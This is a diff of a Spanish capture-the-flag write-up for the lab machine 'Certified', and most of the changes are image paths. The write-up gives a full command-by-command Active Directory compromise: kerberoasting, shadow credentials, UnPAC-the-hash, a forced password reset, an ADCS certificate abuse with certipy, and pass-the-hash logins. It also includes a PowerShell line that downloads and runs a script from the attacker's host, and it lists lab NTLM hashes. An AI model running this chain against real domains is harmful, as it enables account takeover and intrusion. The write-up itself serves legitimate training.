@@ -15,9 +15,9 @@ layout:
     visible: true
 ---
 
-# Certified
+# Copy of gzzcooCertified
 
-<figure><img src="../../../.gitbook/assets/Certified.png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Certified.png" alt="" width="563"><figcaption></figcaption></figure>
 
 ## Reconnaissance
 
@@ -27,7 +27,7 @@ Proceremos a realizar un reconocimiento con **nmap** para ver los puertos que es
 nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.41 -oG allPorts
 ```
 
-<figure><img src="../../../.gitbook/assets/2470_vmware_gTNIKB0MoB.png" alt="" width="434"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2470_vmware_gTNIKB0MoB.png" alt="" width="434"><figcaption></figcaption></figure>
 
 Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX.
 
@@ -37,7 +37,7 @@ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (55).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (55).png" alt="" width="563"><figcaption></figcaption></figure>
 
 Transformaremos el archivo XML obtenido en el resultado de **nmap** y lo transformaremos en un archivo HTML. Levantaremos un servidor HTTP con Python3.
 
@@ -47,11 +47,11 @@ xsltproc targetedXML > index.html
 python3 -m http.server 80
 ```
 
-<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
 
 Accederemos a[ http://localhost](http://localhost) y comprobaremos el resultado en un formato más cómodo para su análisis.
 
-<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
 
 Comprobaremos el nombre del dominio que nos enfrentamos, el nombre del equipo y que tipo de máquina nos enfrentamos.
 
@@ -61,7 +61,7 @@ ldapsearch -x -H ldap://10.10.11.41 -s base | grep defaultNamingContext
 netexec smb 10.10.11.41
 ```
 
-<figure><img src="../../../.gitbook/assets/2471_vmware_Pfp2IWoTZ1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2471_vmware_Pfp2IWoTZ1.png" alt=""><figcaption></figcaption></figure>
 
 Procederemos a añadir la entrada en nuestro archivo **/etc/hosts**
 
@@ -69,7 +69,7 @@ Procederemos a añadir la entrada en nuestro archivo **/etc/hosts**
 catnp /etc/hosts | grep certified.htb
 ```
 
-<figure><img src="../../../.gitbook/assets/2478_vmware_d9FUPBWgOD.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2478_vmware_d9FUPBWgOD.png" alt=""><figcaption></figcaption></figure>
 
 ## RPC Enumeration
 
@@ -81,7 +81,7 @@ Verificamos que hemos procedido a enumerar la lista de usuarios que se encuentra
 rpcenum -e All -i 10.10.11.41 -u 'judith.mader' -p 'judith09'
 ```
 
-<figure><img src="../../../.gitbook/assets/2472_vmware_PtFB4G8Cxq.png" alt="" width="518"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2472_vmware_PtFB4G8Cxq.png" alt="" width="518"><figcaption></figcaption></figure>
 
 Guardaremos los usuarios del dominio enumerados en el archivo **users.txt.**
 
@@ -89,7 +89,7 @@ Guardaremos los usuarios del dominio enumerados en el archivo **users.txt.**
 catnp users.txt
 ```
 
-<figure><img src="../../../.gitbook/assets/2473_vmware_oDJMdFU8UY.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2473_vmware_oDJMdFU8UY.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -103,7 +103,7 @@ Comprobamos que no obtenemos ningún TGT debido que ningun usuario dispone del a
 impacket-GetNPUsers -no-pass -usersfile users.txt certified.htb/ 2>/dev/null
 ```
 
-<figure><img src="../../../.gitbook/assets/2474_vmware_VOySegRcUv.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2474_vmware_VOySegRcUv.png" alt=""><figcaption></figcaption></figure>
 
 ## SMB Enumeration \[FAILED]
 
@@ -113,7 +113,7 @@ A través de la herramienta de **sbmap** procederemos a enumerar los recursos co
 smbmap -H 10.10.11.41 --no-banner -u 'judith.mader' -p 'judith09'
 ```
 
-<figure><img src="../../../.gitbook/assets/2475_vmware_rlqWDams18.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2475_vmware_rlqWDams18.png" alt=""><figcaption></figcaption></figure>
 
 ## Kerberoasting Attack (GetUserSPNs)
 
@@ -125,7 +125,7 @@ impacket-GetUserSPNs -dc-ip 10.10.11.41 certified.htb/judith.mader -request 2>/d
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2476_vmware_LGzs3DrMfs.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2476_vmware_LGzs3DrMfs.png" alt=""><figcaption></figcaption></figure>
 
 ## Cracking hashes \[FAILED]
 
@@ -135,7 +135,7 @@ Procederemos a intentar crackear el hash obtenido del TGS para obtener la contra
 hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
 ```
 
-<figure><img src="../../../.gitbook/assets/2477_vmware_3nITCO4OUf.png" alt="" width="524"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2477_vmware_3nITCO4OUf.png" alt="" width="524"><figcaption></figcaption></figure>
 
 ## LDAP Enumeration (ldapdomaindump)
 
@@ -145,13 +145,13 @@ Con **ldapdomaindump** dumpearemos toda la información del LDAP a través del u
 ldapdomaindump -u 'certified.htb\judith.mader' -p 'judith09' 10.10.11.41 -o ldap
 ```
 
-<figure><img src="../../../.gitbook/assets/2479_vmware_zc70t2x1K7.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2479_vmware_zc70t2x1K7.png" alt=""><figcaption></figcaption></figure>
 
 Revisando el archivo "domain\_users.html" verificamos que el usuario "management\_svc" forma parte del grupo "Remote Management Users", con el cual podríamos conectarnos al DC a través de WinRM, PsExec, etc.
 
 Este es el usuario que hemos obtenido el TGS (Ticket Granting Service) pero no hemos podido crackear su hash.
 
-<figure><img src="../../../.gitbook/assets/2480_vmware_7DGBmp0cZz.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2480_vmware_7DGBmp0cZz.png" alt=""><figcaption></figcaption></figure>
 
 ## BloodHound Enumeration
 
@@ -163,7 +163,7 @@ bloodhound-python -c all -u judith.mader -p 'judith09' -d certified.htb -ns 10.1
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2481_vmware_lI25VY5T1I.png" alt="" width="551"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2481_vmware_lI25VY5T1I.png" alt="" width="551"><figcaption></figcaption></figure>
 
 ### Abusing WriteOwner Privilege (bloodyAD)
 
@@ -171,7 +171,7 @@ Revisando **BloodHound** para buscar una vía potencial de escalar nuestros priv
 
 Esto puede ser intersante para realizar un **Lateral Movement** y realizar posteriormente un **Shadow Credentials Attack**.
 
-<figure><img src="../../../.gitbook/assets/2482_vmware_6OUh26b95n.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2482_vmware_6OUh26b95n.png" alt=""><figcaption></figcaption></figure>
 
 A través de la herramienta de **bloodyAD**, procederemos a establecer al usuario "judith.mader" como propietaria del grupo "management@certified.htb".
 
@@ -187,7 +187,7 @@ net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.made
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2483_vmware_d37cukpEGr.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2483_vmware_d37cukpEGr.png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing GenericWrite Privilege - Shadow Credentials Attack (pyWhisker.py)
 
@@ -201,7 +201,7 @@ python3 /opt/pywhisker/pywhisker/pywhisker.py --dc-ip 10.10.11.41 -d "certified.
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2484_vmware_ORecB06OH9.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2484_vmware_ORecB06OH9.png" alt=""><figcaption></figcaption></figure>
 
 ### unPAC the hash (gettgtpkinit.py && getnthash.py)
 
@@ -215,7 +215,7 @@ python /opt/PKINITtools/gettgtpkinit.py -dc-ip 10.10.11.41 certified.htb/MANAGEM
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2485_vmware_YzB09i7rsA.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2485_vmware_YzB09i7rsA.png" alt=""><figcaption></figcaption></figure>
 
 Una vez con el TGT generado, procederemos a extraer el hash NTLM del usuario objetivo. Verificamos que hemos conseguido el hash NTLM del usuario "management\_svc@certified.htb".
 
@@ -225,7 +225,7 @@ python /opt/PKINITtools/getnthash.py -dc-ip 10.10.11.41 certified.htb/MANAGEMENT
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2486_vmware_o79eT47JwN.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2486_vmware_o79eT47JwN.png" alt=""><figcaption></figcaption></figure>
 
 ## Initial Access
 
@@ -237,7 +237,7 @@ Procederemos a validar el hash NTLM obtenido del usuario "management\_svc@certif
 netexec winrm 10.10.11.41 -u 'MANAGEMENT_SVC' -H 'a091c1832bcdd4677c28b5a6a1295584'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing WinRM
 
@@ -249,7 +249,7 @@ Verificaremos la flag de **user.txt**.
 evil-winrm -i 10.10.11.41 -u 'MANAGEMENT_SVC' -H 'a091c1832bcdd4677c28b5a6a1295584'
 ```
 
-<figure><img src="../../../.gitbook/assets/2487_vmware_W2EGEsXwQz.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2487_vmware_W2EGEsXwQz.png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -269,25 +269,25 @@ IEX (New-Object Net.WebClient).downloadString("http://10.10.14.19/adPEAS.ps1")
 Invoke-adPEAS
 ```
 
-<figure><img src="../../../.gitbook/assets/2488_vmware_XmvGm1oj2U.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2488_vmware_XmvGm1oj2U.png" alt=""><figcaption></figcaption></figure>
 
 Dentro del resultado del análisis nos encuentra información sobre _Active Directory Certificate Services_ en el cual nos reporta de posiblemente sea vulnerable pero es manegada por el usuario "ca\_operator@certified.htb".
 
-<figure><img src="../../../.gitbook/assets/2489_vmware_5Y0RuR3qIe.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2489_vmware_5Y0RuR3qIe.png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing GenericAll Privilege (Changing user credentials from Powershell)
 
 Revisando nuevamente el **BloodHound**, comprobamos que el usuario "management\_svc@certified.htb" dispone de privilegios de **GenericAll** sobre el usuario "ca\_operator@certified.htb".
 
-<figure><img src="../../../.gitbook/assets/2490_vmware_KwKy5kbcFy.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2490_vmware_KwKy5kbcFy.png" alt=""><figcaption></figcaption></figure>
 
 Teniendo estos permisos, podemos a llegar a cambiar las credenciales sobre el usuario "ca\_operator@certified.htb".
 
-<figure><img src="../../../.gitbook/assets/2491_vmware_NrhOGyXeHJ.png" alt="" width="446"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2491_vmware_NrhOGyXeHJ.png" alt="" width="446"><figcaption></figcaption></figure>
 
 El propio **BloodHound** nos indica como podemos llegar a explotar este privilegio. En este caso, debido que disponemos del acceso a la máquina Windows, podemos realizar el "Windows Abuse".
 
-<figure><img src="../../../.gitbook/assets/2492_vmware_A0YoKJpzG6.png" alt="" width="443"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2492_vmware_A0YoKJpzG6.png" alt="" width="443"><figcaption></figcaption></figure>
 
 Procederemos a realizar las credenciales del usuario "CA\_OPERATOR" desde la sesión de "management\_svc@certified.htb" que disponemos en WinRM.
 
@@ -297,7 +297,7 @@ $UserPassword = ConvertTo-SecureString 'Gzzcoo123' -AsPlainText -Force
 Set-DomainUserPassword -Identity CA_OPERATOR -AccountPassword $UserPassword
 ```
 
-<figure><img src="../../../.gitbook/assets/2493_vmware_VXIYu4jIzJ.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2493_vmware_VXIYu4jIzJ.png" alt=""><figcaption></figcaption></figure>
 
 Procederemos a validar que se han modificado correctamente las credenciales del usuario en cuestión.
 
@@ -305,7 +305,7 @@ Procederemos a validar que se han modificado correctamente las credenciales del 
 netexec smb 10.10.11.41 -u 'CA_OPERATOR' -p 'Gzzcoo123'
 ```
 
-<figure><img src="../../../.gitbook/assets/2494_vmware_bsnuAuGP6Z.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2494_vmware_bsnuAuGP6Z.png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing Advice Directory Certificate Services (ADCS) <a href="#abusing-advice-directory-certificate-services-adcs" id="abusing-advice-directory-certificate-services-adcs"></a>
 
@@ -338,7 +338,7 @@ certipy-ad find -u CA_OPERATOR@certified.htb -p 'Gzzcoo123' -dc-ip 10.10.11.41 -
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2495_vmware_OuGAxAR1lX.png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2495_vmware_OuGAxAR1lX.png" alt="" width="563"><figcaption></figcaption></figure>
 
 En este caso, disponemos de que el usuario "management\_svc@certified.htb" dispone de permisos de **GenericWrite** sobre el usuario "ca\_operator@certified.htb".
 
@@ -354,7 +354,7 @@ netexec smb 10.10.11.41 -u 'CA_OPERATOR' -H '613a519b5b0ef57c07bc6395aa1aff14'
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2496_vmware_E0ErQf2bB9.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2496_vmware_E0ErQf2bB9.png" alt=""><figcaption></figcaption></figure>
 
 Utilizamos Certipy para actualizar el UPN de la cuenta **CA\_OPERATOR**, asignándole el valor de **Administrator**. Esto nos permite asociar cualquier certificado emitido a **CA\_OPERATOR** con la identidad de **Administrator**:
 
@@ -364,7 +364,7 @@ certipy-ad account update -username MANAGEMENT_SVC@certified.htb -hashes ':a091c
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2497_vmware_gZCnQVgrUF.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2497_vmware_gZCnQVgrUF.png" alt=""><figcaption></figcaption></figure>
 
 Solicitamos un certificado utilizando la plantilla vulnerable **CertifiedAuthentication**. Este certificado se emitió con el UPN de **Administrator**, habilitando su uso para autenticación con privilegios elevados:
 
@@ -374,7 +374,7 @@ certipy-ad req -username CA_OPERATOR@certified.htb -hashes 613a519b5b0ef57c07bc6
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2498_vmware_jyZkNvIaIo.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2498_vmware_jyZkNvIaIo.png" alt=""><figcaption></figcaption></figure>
 
 Posteriormente, restauramos el UPN de **CA\_OPERATOR** a su valor original para minimizar evidencias de la modificación realizada.
 
@@ -388,7 +388,7 @@ certipy-ad auth -pfx administrator.pfx -domain certified.htb
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/2499_vmware_lhpHWqABtq.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2499_vmware_lhpHWqABtq.png" alt=""><figcaption></figcaption></figure>
 
 Obtenido el hash NTLM, procederemos a validar las credenciales a través de **netexec** y una vez verificado que son credenciales correctas, procederemos a autenticarnos a través de **evil-winrm**.
 
@@ -400,4 +400,4 @@ netexec smb 10.10.11.41 -u 'Administrator' -H '0d5b49608bbce1751f708748f67e2d34'
 evil-winrm -i 10.10.11.41 -u 'Administrator' -H '0d5b49608bbce1751f708748f67e2d34'
 ```
 
-<figure><img src="../../../.gitbook/assets/2500_vmware_YYXDj7sVuS.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2500_vmware_YYXDj7sVuS.png" alt=""><figcaption></figcaption></figure>
